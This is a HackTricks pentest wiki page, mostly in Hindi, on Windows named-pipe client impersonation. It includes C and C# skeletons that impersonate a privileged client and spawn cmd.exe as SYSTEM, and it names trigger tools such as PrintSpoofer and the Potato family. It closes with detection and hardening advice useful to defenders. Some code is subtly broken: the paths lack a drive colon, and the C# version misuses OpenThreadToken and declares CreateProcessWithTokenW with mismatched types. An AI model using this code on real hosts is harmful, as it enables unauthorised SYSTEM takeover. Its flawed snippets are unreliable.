# Named Pipe Client Impersonation

{{#include ../../banners/hacktricks-training.md}}

Named Pipe client impersonation एक local privilege escalation primitive है जो एक named-pipe server थ्रेड को उस क्लाइंट का security context अपनाने देगा जो उससे कनेक्ट होता है। व्यवहार में, एक attacker जो SeImpersonatePrivilege के साथ कोड चला सकता है, एक privileged client (उदा. एक SYSTEM service) को attacker-controlled pipe से कनेक्ट करवाने, ImpersonateNamedPipeClient कॉल करने, प्राप्त token को primary token में duplicate करने, और क्लाइंट के रूप में एक प्रोसेस spawn करने (अक्सर NT AUTHORITY\SYSTEM) के लिए बाध्य कर सकता है।

यह पृष्ठ मूल तकनीक पर केंद्रित है। SYSTEM को आपकी pipe से जोड़ने वाले end-to-end exploit chains के लिए, नीचे संदर्भित Potato family पृष्ठ देखें।

## TL;DR
- एक named pipe बनाएं: \\.\pipe\<random> और कनेक्शन का इंतज़ार करें।
- किसी privileged component को इससे कनेक्ट कराएँ (spooler/DCOM/EFSRPC/etc.)।
- pipe से कम से कम एक संदेश पढ़ें, फिर ImpersonateNamedPipeClient कॉल करें।
- वर्तमान थ्रेड से impersonation token खोलें, DuplicateTokenEx(TokenPrimary) करें, और CreateProcessWithTokenW/CreateProcessAsUser का उपयोग करके SYSTEM प्रोसेस प्राप्त करें।

## Requirements and key APIs
- कॉल करने वाले process/thread को सामान्यतः जिन privileges की आवश्यकता होती है:
- SeImpersonatePrivilege ताकि कनेक्ट होने वाले क्लाइंट की सफलतापूर्वक impersonation की जा सके और CreateProcessWithTokenW का उपयोग किया जा सके।
- वैकल्पिक रूप से, SYSTEM की impersonation करने के बाद आप CreateProcessAsUser का उपयोग कर सकते हैं, जिसके लिए SeAssignPrimaryTokenPrivilege और SeIncreaseQuotaPrivilege की आवश्यकता हो सकती है (ये जब आप SYSTEM की impersonation कर रहे होते हैं तब संतुष्ट होते हैं)।
- उपयोग की जाने वाली मुख्य APIs:
- CreateNamedPipe / ConnectNamedPipe
- ReadFile/WriteFile (impersonation से पहले कम से कम एक संदेश पढ़ना आवश्यक है)
- ImpersonateNamedPipeClient and RevertToSelf
- OpenThreadToken, DuplicateTokenEx(TokenPrimary)
- CreateProcessWithTokenW or CreateProcessAsUser
- Impersonation level: लोकली उपयोगी कार्य करने के लिए, client को SecurityImpersonation की अनुमति देनी चाहिए (कई local RPC/named-pipe clients के लिए डिफ़ॉल्ट)। क्लाइंट pipe खोलते समय SECURITY_SQOS_PRESENT | SECURITY_IDENTIFICATION के साथ इसे घटा सकते हैं।

## Minimal Win32 workflow (C)
```c
// Minimal skeleton (no error handling hardening for brevity)
#include <windows.h>
#include <stdio.h>

int main(void) {
LPCSTR pipe = "\\\\.\\pipe\\evil";
HANDLE hPipe = CreateNamedPipeA(
pipe,
PIPE_ACCESS_DUPLEX,
PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT,
1, 0, 0, 0, NULL);

if (hPipe == INVALID_HANDLE_VALUE) return 1;

// Wait for privileged client to connect (see Triggers section)
if (!ConnectNamedPipe(hPipe, NULL)) return 2;

// Read at least one message before impersonation
char buf[4]; DWORD rb = 0; ReadFile(hPipe, buf, sizeof(buf), &rb, NULL);

// Impersonate the last message sender
if (!ImpersonateNamedPipeClient(hPipe)) return 3; // ERROR_CANNOT_IMPERSONATE==1368

// Extract and duplicate the impersonation token into a primary token
HANDLE impTok = NULL, priTok = NULL;
if (!OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, FALSE, &impTok)) return 4;
if (!DuplicateTokenEx(impTok, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &priTok)) return 5;

// Spawn as the client (often SYSTEM). CreateProcessWithTokenW requires SeImpersonatePrivilege.
STARTUPINFOW si = { .cb = sizeof(si) }; PROCESS_INFORMATION pi = {0};
if (!CreateProcessWithTokenW(priTok, LOGON_NETCREDENTIALS_ONLY,
L"C\\\\Windows\\\\System32\\\\cmd.exe", NULL,
0, NULL, NULL, &si, &pi)) {
// Fallback: CreateProcessAsUser after you already impersonated SYSTEM
CreateProcessAsUserW(priTok, L"C\\\\Windows\\\\System32\\\\cmd.exe", NULL,
NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
}

RevertToSelf(); // Restore original context
return 0;
}
```
नोट्स:
- यदि ImpersonateNamedPipeClient ERROR_CANNOT_IMPERSONATE (1368) लौटाता है, तो पहले pipe से पढ़ना सुनिश्चित करें और कि client ने impersonation को Identification level तक सीमित नहीं किया है।
- DuplicateTokenEx का उपयोग SecurityImpersonation और TokenPrimary के साथ करें ताकि process creation के लिए उपयुक्त primary token बनाया जा सके।

## .NET त्वरित उदाहरण
In .NET, NamedPipeServerStream RunAsClient के माध्यम से impersonate कर सकता है। एक बार impersonating हो जाने पर, thread token को duplicate करें और एक process बनाएं।
```csharp
using System; using System.IO.Pipes; using System.Runtime.InteropServices; using System.Diagnostics;
class P {
[DllImport("advapi32", SetLastError=true)] static extern bool OpenThreadToken(IntPtr t, uint a, bool o, out IntPtr h);
[DllImport("advapi32", SetLastError=true)] static extern bool DuplicateTokenEx(IntPtr e, uint a, IntPtr sd, int il, int tt, out IntPtr p);
[DllImport("advapi32", SetLastError=true, CharSet=CharSet.Unicode)] static extern bool CreateProcessWithTokenW(IntPtr hTok, int f, string app, string cmd, int c, IntPtr env, string cwd, ref ProcessStartInfo si, out Process pi);
static void Main(){
using var s = new NamedPipeServerStream("evil", PipeDirection.InOut, 1);
s.WaitForConnection();
// Ensure client sent something so the token is available
s.RunAsClient(() => {
IntPtr t; if(!OpenThreadToken(Process.GetCurrentProcess().Handle, 0xF01FF, false, out t)) return; // TOKEN_ALL_ACCESS
IntPtr p; if(!DuplicateTokenEx(t, 0xF01FF, IntPtr.Zero, 2, 1, out p)) return; // SecurityImpersonation, TokenPrimary
var psi = new ProcessStartInfo("C\\Windows\\System32\\cmd.exe");
Process pi; CreateProcessWithTokenW(p, 2, null, null, 0, IntPtr.Zero, null, ref psi, out pi);
});
}
}
```
## SYSTEM को आपकी pipe से जोड़ने के सामान्य ट्रिगर/जबरदस्ती
ये तकनीकें privileged services को मजबूर करती हैं कि वे आपकी named pipe से कनेक्ट करें ताकि आप उन्हें impersonate कर सकें:
- Print Spooler RPC trigger (PrintSpoofer)
- DCOM activation/NTLM reflection variants (RoguePotato/JuicyPotato[NG], GodPotato)
- EFSRPC pipes (EfsPotato/SharpEfsPotato)

See detailed usage and compatibility here:

-
{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}
-
{{#ref}}
juicypotato.md
{{#endref}}

If you just need a full example of crafting the pipe and impersonating to spawn SYSTEM from a service trigger, see:

-
{{#ref}}
from-high-integrity-to-system-with-name-pipes.md
{{#endref}}

## त्रुटि निवारण और सावधानियाँ
- ImpersonateNamedPipeClient को कॉल करने से पहले pipe से कम से कम एक संदेश पढ़ना आवश्यक है; अन्यथा आपको ERROR_CANNOT_IMPERSONATE (1368) मिलेगा।
- यदि client SECURITY_SQOS_PRESENT | SECURITY_IDENTIFICATION के साथ कनेक्ट करता है, तो server पूरी तरह impersonate नहीं कर सकता; token के impersonation स्तर की जांच GetTokenInformation(TokenImpersonationLevel) के माध्यम से करें।
- CreateProcessWithTokenW कॉल करने वाले पर SeImpersonatePrivilege की आवश्यकता होती है। यदि यह ERROR_PRIVILEGE_NOT_HELD (1314) के साथ फेल होता है, तो पहले SYSTEM को impersonate करने के बाद CreateProcessAsUser का उपयोग करें।
- यदि आपने pipe को harden किया है तो सुनिश्चित करें कि आपकी pipe का security descriptor target service को कनेक्ट करने की अनुमति देता है; डिफ़ॉल्ट रूप से, pipes under \\.\pipe server की DACL के अनुसार एक्सेसिबल होते हैं।

## डिटेक्शन और हार्डनिंग
- named pipe निर्माण और कनेक्शनों की निगरानी करें। Sysmon Event IDs 17 (Pipe Created) और 18 (Pipe Connected) वैध pipe नामों का बेसलाइन बनाने और token-manipulation इवेंट्स से पहले होने वाले असामान्य, रैंडम-लगने वाले pipes को पकड़ने में उपयोगी हैं।
- निम्न क्रम की तलाश करें: process एक pipe बनाता है, एक SYSTEM service कनेक्ट होती है, और फिर बनाने वाला process SYSTEM के रूप में एक child spawn करता है।
- जोखिम कम करने के लिए गैर-आवश्यक service accounts से SeImpersonatePrivilege हटा दें और उच्च privileges वाले अनावश्यक service logons से बचें।
- Defensive development: untrusted named pipes से कनेक्ट करते समय SECURITY_SQOS_PRESENT के साथ SECURITY_IDENTIFICATION निर्दिष्ट करें ताकि servers आवश्यक होने तक client को पूरी तरह impersonate न कर सकें।

## संदर्भ
- Windows: ImpersonateNamedPipeClient दस्तावेज़ (impersonation आवश्यकताएँ और व्यवहार). https://learn.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-impersonatenamedpipeclient
- ired.team: Windows named pipes privilege escalation (walkthrough and code examples). https://ired.team/offensive-security/privilege-escalation/windows-namedpipes-privilege-escalation

{{#include ../../banners/hacktricks-training.md}}
